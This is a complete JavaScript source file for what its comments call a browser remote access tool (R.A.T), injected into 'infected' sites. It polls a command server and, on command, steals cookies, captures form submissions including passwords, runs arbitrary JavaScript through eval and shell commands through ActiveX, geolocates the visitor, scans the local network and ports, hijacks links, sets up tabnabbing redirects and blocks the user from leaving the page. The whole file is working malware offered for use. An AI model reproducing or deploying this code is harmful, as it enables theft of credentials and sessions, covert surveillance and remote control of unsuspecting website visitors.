//Section: Global Variables

var debug_mode = 1;
var clientID = "";
var listening = false;
var afterError = false;
var intervalHost;
var allFormData = "";
var validIPs = "";
var lastIP = "";
var validSubnetFound = false;
var blocked_ports = [0,1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,139,143,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,2049,4045,6000];
var actionIntervalHost;
var inactiveTime = 0;
var tabNabSite = "";
var canTabNab = false;
var serverLocation = "http://192.168.10.56:80";

//Section: Helper Methods

function Log(message) //Log messages
{
	if (debug_mode == 1) console.log(message); //Only log if debug_mode is set
}

function CheckjQuery() //Check if jQuery exists
{
	if (typeof jQuery == "undefined") return false; //jQuery is undefined, not existing
	return true; //jQuery is defined, existing
}

function LoadjQuery() //Load yQuery into the document
{
	var scriptTag = document.createElement("script"); //Create HTML Script Tag
	scriptTag.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"; //Source is jQuery hosted on googleapis
	scriptTag.type = "text/javascript"; //Script type is javascript
	document.getElementsByTagName("head")[0].appendChild(scriptTag); //Insert the scriptag to the head section of the HTML document
}

var waitForjQuery = function () //Wait for jQuery to load
{
	if (CheckjQuery) //Jquery is loaded
	{
		Log("jQuery loaded");
		startListener(); //Start polling
	}
	else //jQuery is not yet loaded
	{
		window.setTimeout(waitForjQuery, 1000); //Wait another 1 second
	}
};

function infectAllForms() //infect all forms on a website (on submit sends all from data to server)
{
	var all = document.getElementsByTagName("*"); //Get every element on zhe page

	for (var i=0, max=all.length; i < max; i++) { //Loop through every element
		 var element = all[i]; //The current element
		 var element_type = '<' + element.tagName.toLowerCase() + '>'; //Element tag name
		 Log(element_type);
		 if (element_type == "<form>") //if this is a form element
		 {
			var formElements = element.getElementsByTagName("input"); //Get all input elements in this form
			
			for (var c = 0; c < formElements.length; c++) //Loop through every input element in this form
			{
				var input = formElements[c]; //The current input element
				var inputName = input.name; //The name of the input element
				Log("FORM input: " + inputName);
				
				if (input.type == "submit") //If the input element is a submit button
				{
					Log("Submit element found!");
					
					input.addEventListener("click", function() { //Add a click event listener to the submit button
						//Submit clicked
						var form = this.parentElement; //The form element
						var inputs = form.getElementsByTagName("input"); //The input elements of this form element
						
						for (var t = 0 ; t < inputs.length; t++) //Loop thorugh all input elements in this form element
						{
							allFormData = allFormData + inputs[t].name + ":" + inputs[t].value + ";"; //Append element name, value to allFormData
						}
						
						var data = { //The data structure
							client: clientID,
							command: "formData",
							formDump: allFormData,
							site: window.location.href
						};
						
						$.ajax({
							type: "GET", //Get request
							data: data, //The above data structure
							dataType: "text", //data type is text, so the server doesn't need to send json back
							url: serverLocation //the destination (your server)
						});

					});
				}
			}
		 }
	}
}

function getBrowserInfo() //Get the size of the screen
{
	return "screenX: \"" + screen.width + "\";screenY: \"" + screen.height + "\"";
}

function isPopUpBlocked() //Check if pop ups are blocked by the browser
{
	//Define new pop up window
	var popWindow = window.open("/", "wName", "width=1, height=1, left="+screen.width+", top="+screen.height+", scrollbars, resizable");
	
	if (popWindow == null || typeof(popWindow) == "undefined") return "Browser blocked pop-up Window"; //Blocked
	else //Not blocked, and close it
	{
		popWindow.close();
		return "Browser didn't block pop-up window";
	}
}

function isActiveXUnsafe() //Checks if ActiveX code can run
{
	 try {
        var axObject = new ActiveXObject("WbemScripting.SWbemLocator"); //Example ActiveX Object
		return "ActiveX State: ActiveX configured unsafe";
    } catch (e) {
        return "ActiveX State: ActiveX configured safe";
    }
}

function playAudio(audioUrl) //Plays audio files based on input url
{
	//define new audio player
	var audioPlayer = new Audio(audioUrl);
	//Play audio
	audioPlayer.play();
	return "Audio Executed"
}

function hijackLinks(newUrl) //Replace all "a" element's href attribute with a custom link
{
	$("a").attr("href", newUrl);
	return "Links Replaced";
}

function showPrompt(promptMessage) //Show a basic prompt and return the answer
{
	 var result = prompt(promptMessage);
	 return "User'a Answer to prompt is: " + result;
}

function redirectPage(targetPage) //redirect the browser to a new page
{
	window.location = targetPage;
	return "User's browser is redirected to " + targetPage;
}

function tryGeoLocate() //Try to get coordinates via geolocation API
{
	if (!navigator.geolocation) return "404 GeoLocation API not available";
	var lat = "";
	var lng = "";
	var error = "";
	
	navigator.geolocation.getCurrentPosition(
		function (location) //onSuccess
		{
			lat = location.coords.latitude;
			lng = location.coords.longitude;

			var locationData = {
				latitude: lat,
				longitude: lng,
				command: "storeLocation",
				client: clientID
			};

			$.ajax({
				dataType: "text",
				url: serverLocation,
				data: locationData,
				method: "GET"
			});
		},
		
		function (errorCode) //onError
		{
			if (errorCode.code == 0) error = "404 Unknown Error occured during location query";
			if (errorCode.code == 1) error = "404 GeoLocation permission denied by user";
			if (errorCode.code == 2) error = "404 Failed to get position, position not available";
			if (errorCode.code == 3) error = "404 GeoLocation request timed out";
			
			var locationErrorData = {
				client: clientID,
				command: "errorLocation",
				message: error
			};

			$.ajax({
				method: "GET",
				dataType: "text",
				data: locationErrorData,
				url: serverLocation
			});
		},
		
		{enableHighAccuracy:true, maximumAge:30000, timeout:27000} //Additional options
	);

	return "Trying to geolocate target...";
}

function executeJavaScript(jsCode) //Execute plain javascript
{
	eval(jsCode);
	return "JavaScript Code Executed";
}

function scanIPClassC(fixIpStart) //scan common IP Class C ranges
{
	var start = ["192.168.0.", "192.168.1.", "192.168.10."];
	var o4 = 0;
	var extraTimeout = 0;
	if (typeof(fixIpStart) != "undefined")
	{
		start.splice(0, start.length);
		start.push(fixIpStart + ".");
	}
	start.map(function (item){
		if (!validSubnetFound)
		{
			for (o4 = 0; o4 < 255; o4++)
			{
				var address = item + o4;
				
				IPScan(address, extraTimeout);
				Log("Scanning: " + address + " started, sleeping: " + (10000 + extraTimeout).toString());
				if (o4 == 254) lastIP = address;
				
				extraTimeout += 1000;
			}
		}
	});
	
	validSubnetFound = false;
}

function IPScan(ip, timeoutIncrement) //Scan an invidual IP address
{
	setTimeout(function () {
		$.ajax({
			method: "GET",
			url: "http://" + ip + ":61234/",
			timeout: 5000,
			error: function (xhr, text, twerror)
			{
				if (text != "timeout")
				{
					validIPs += ip + " - Online;";
					Log(ip + " is online");
					validSubnetFound = true;
				}
				else Log(ip + " is offline -> " + text);
				
				if (ip == lastIP)
				{
					var ipData = {
						command: "pingResult",
						client: clientID,
						result: validIPs
					};

					$.ajax({
						method: "GET",
						dataType: "text",
						data: ipData,
						url: serverLocation
					});
				}
			}
		});
	}, 10000 + timeoutIncrement);
}

function scanPort(ip, port) //Scan a port for an IP address
{
	if (blocked_ports.indexOf(port) != -1)
	{
		Log("Connecting to this port is blocked by the browser");
		return "404 Connection to this port is blocked by the browser";
	}
	
	var img = new Image();

	img.onerror = function () {
		if (!img) return;
		img = undefined;
		Log(ip + ":" + port + " - Open");
		var portData = {
			command: "portResult",
			client: clientID,
			message: ip + ":" + port + " - Open"
		};

		$.ajax({
			method: "GET",
			dataType: "text",
			data: portData,
			url: serverLocation
		});
	};

	img.onload  = img.onerror;
	
	img.src = 'http://' + ip + ':' + port;

	setTimeout(function () {
		if (!img) return;
		img = undefined;
		Log(ip + ":" + port + " - Closed");

		var portData = {
			command: "portResult",
			client: clientID,
			message: ip + ":" + port + " - Closed"
		};

		$.ajax({
			method: "GET",
			dataType: "text",
			data: portData,
			url: serverLocation
		});

	}, 5000);

	return "200 Scanning Port";
}

function preventClose() //Setup blocking method
{
	window.onbeforeunload = setUpPrevention;
}

function setUpPrevention(e) //Prevent page close (chrome not working)
{
	if (e.stopPropagation) {
		e.stopPropagation();
		e.preventDefault();
		e.returnValue = "The page is still working on something, are you sure you want to leave?\nAll unsaved data will be lost";
	}
	
	displayDialog();
}

function displayDialog() //Display a message
{
	if (confirm("The page is still working on something, are you sure you want to leave?\nAll unsaved data will be lost")) displayDialog();
	return "asd";
}

function createTabNab(targetSite, inactivityTime) //Register a new TabNab action
{
	tabNabSite = targetSite; //The new site
	inactiveTime = inactivityTime; //The inactive time after redirection hapens
	canTabNab = true; //Allow tabNabbing
	return "200 TabNabbing setup completed";
}

function tabNabRedirect() //Redirect page
{
	if (canTabNab)
	{
		var tabNabData = {
			command: "tabNabReport",
			client: clientID,
			site: tabNabSite
		};

		$.ajax({
			method: "GET",
			dataType: "text",
			data: tabNabData,
			url: serverLocation
		});

		canTabNab = false;
		clearInterval(actionIntervalHost);
		window.location = tabNabSite;
	}
}

//Page focus lost, start inactive countdown
window.onblur = function () {
	if (canTabNab) actionIntervalHost = setTimeout(tabNabRedirect, inactiveTime);
};

//Page got focus, reset and stop the countdown
window.onfocus = function () {
	if (typeof actionIntervalHost != "undefined" && actionIntervalHost != null && canTabNab)
	{
		clearInterval(actionIntervalHost);
		actionIntervalHost = null;
	}
};

function executeActiveX(command) //Execute an ActiveX Command
{
	try
	{
		var axObject = new ActiveXObject("WScript.Shell");
		axObject.run(command);
		return "Command Executed";
	}
	catch (e)
	{
		return "Command Execution Failed!";
	}
}

function appendHtmlCode(htmlCode) //Insert html at the end of the document
{
	var div = document.createElement("div");
	div.insertAdjacentHTML("beforeend", htmlCode);
	document.body.appendChild(div);
	return "200 HTML Inserted at the end of the page";
}

//Section: R.A.T main

if (!CheckjQuery()) //If jQuery is not present
{
	Log("jQuery not found, continuing to load");
	LoadjQuery(); //load jQuery
	window.setTimeout(waitForjQuery, 1000); //Wait for jQuery to load
}
else //jQuery is present on the infected site
{
	Log("jQuery found, executing listener");
	startListener(); //Start listening
}

function handleCommand(command) //Handle and execute commands
{
	Log("handle command");
	if (command == "test") //test command, for testing connection - request - response
	{
		Log("test received");
		return "200 OK";
	}
	else if (command == "reassign") //called when the server wants the clients to request new client IDs
	{
		clientID = ""; //Set the client id to "" so at the next startListener() call register is sent -> requesting new client ID
		return ""; //Return "" -> to don't send feedback
	}
	else if (command.startsWith("alert ")) //Display an alert box with the specified text
	{
		var message = command.substring(6);
		alert(message);
		return "200 User responded to alert";
	}
	else if (command == "get-site") //Get the current url
	{
		return window.location.href;
	}
	else if (command.startsWith("push-html ")) //replace all html contents with the specified one
	{
		var html = command.substring(10);
		document.write(html);
		return "200 HTML Content rewritten!";
	}
	else if (command == "get-cookie") //Get the cookies of this site
	{
		var cookie = document.cookie;
		if (cookie == "") return "200 No Cookies present on this site"
		return document.cookie;
	}
	else if (command == "form-infect") //Infect all forms on a page
	{
		infectAllForms();
		return "200 All forms on this page are infected";
	}
	else if (command == "get-info")
	{
		return getBrowserInfo();
	}
	else if (command == "check-pop-up")
	{
		return isPopUpBlocked();
	}
	else if (command == "check-activex")
	{
		return isActiveXUnsafe();
	}
	else if (command.startsWith("play-audio "))
	{
		var audioUrl = command.substring(11);
		return playAudio(audioUrl);
	}
	else if (command.startsWith("hijack-link "))
	{
		var targetLink = command.substring(12);
		return hijackLinks(targetLink);
	}
	else if (command.startsWith("prompt "))
	{
		var message = command.substring(7);
		return showPrompt(message);
	}
	else if (command.startsWith("redirect "))
	{
		var targetLink = command.substring(9);
		return redirectPage(targetLink);
	}
	else if (command == "geolocate")
	{
		return tryGeoLocate();
	}
	else if (command.startsWith("execute-js "))
	{
		var jScript = command.substring(11);
	 	return executeJavaScript(jScript);
	}
	else if (command.startsWith("ip-scan "))
	{
		var fixSubnet = command.substring(8);
		scanIPClassC(fixSubnet);
		return "Scanning the specified subnet";
	}
	else if (command == "ip-scan")
	{
		scanIPClassC();
		return "Scanning common IP subnets";
	}
	else if (command.startsWith("port-scan "))
	{
		var ip = command.split(" ")[1];
		var port = command.split(" ")[2];

		return scanPort(ip, port);
	}
	else if (command == "prevent-close")
	{
		preventClose();
		return "Close prevention activated";
	}
	else if (command.startsWith("tabnab "))
	{
		var targetLink = command.split(" ")[1];
		var waitTime = command.split(" ")[2];

		return createTabNab(targetLink, parseInt(waitTime));
	}
	else if (command.startsWith("append-html "))
	{
		var htmlCode = command.substring(12);
		return appendHtmlCode(htmlCode);
	}
	else if (command.startsWith("execute-ax "))
	{
		var activeXCommand = command.substring(11);
		return executeActiveX(activeXCommand);
	}
	else if (command == "") //Add this otherwise client will send 404 unknown command when no command is available
	{
		return "";
	}
	else //Undefined command
	{
		return "404 Unknown Command";
	}
}

function postFeedback(fback) //Send feedback about a command to the server
{
	var data = { //Define the data object
		command: "feedback", //Feedback command
		client: clientID, //Out client ID
		text: fback //The actual feedback
	};
	
	$.ajax({ //Send to server
		type: "GET", //GET Request
		data: data, //The data defined above
		dataType: "text", //DataType is text (not JSON, so we doesn't get a parsing error if server response is non-json)
		url: serverLocation //The destination (your server)
	});
}

function startListener() //Get commands, register client
{
	if (!listening) //If interval is not set, set it
	{
		intervalHost = setInterval(startListener, 10000); //10 second interval
		listening = true; //Now we have the interval set
	}
	
	var data; //Data object to send
	
	if (clientID == "") //Our client is not yet registered
	{
		data = {
			command: "register" //So register it
		};
	}
	else //Out client is registered
	{
		data = {
			client: clientID,
			command: "getCommand" //Look for new commands
		};
	}
	
		$.ajax({
			type: "GET", //GET Request
			url: serverLocation, //Destination (your server)
			data: data, //The data defined above
			dataType: "json", //JSON Data type
			setTimeout: 3000, //Set the connection timeout to 3 seconds
			success: function(ldata) {
				Log(ldata); //Log the response from the server
					
				if (data.command == "register") //Register client
				{
					clientID = ldata.result; //Set clientID to next available ID
					if (afterError) //If connection comes back after error
					{
						afterError = false; //Set the varible back
						clearInterval(intervalHost); //Clear the 1 minute interval
						intervalHost = setInterval(startListener, 10000); //Set the 10 seconds interval
					}
				}
				else if (data.command == "getCommand") //Get command from server
				{
					var cmdResult = handleCommand(ldata.result); //Execute command and get result
					if (cmdResult != "") postFeedback(cmdResult); //If command had result post it back to server
				}
			},
			error: function(xhr, opt, twerror)
			{
				Log(twerror); //Log errors during XHR requests
				//The server is not reachable
				clientID = ""; //Set client id to nothing, so when the server comes online all clients register back
				clearInterval(intervalHost); //Remove the previous interval to call startListerner
				intervalHost = setInterval(startListener, 60000); //Create a new interval 6 times slower than the first to reduce network traffic to unreachable destinations
				afterError = true; //Set a global variable, os when the connection comes back reset the interval and set it to 10 seconds
			}
		});
}